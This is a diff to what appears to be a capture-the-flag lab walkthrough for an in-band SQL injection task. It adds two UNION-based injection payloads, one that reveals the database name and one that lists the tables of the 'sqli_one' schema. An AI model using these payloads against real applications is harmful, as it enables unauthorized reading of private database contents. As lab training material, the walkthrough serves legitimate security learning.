@@ -30,4 +30,13 @@ Nov 23, 2021
 	- ;
 
 ## Task 5: In-Band SQLi?
-#### Deploy the machine 
+Deploy the machine, then use the given commands in the task.
+```
+0 UNION SELECT 1,2,database()
+```
+This will give you the database, then use the next one 
+```
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+```
+This will show the different table name in the sqli_one database
+
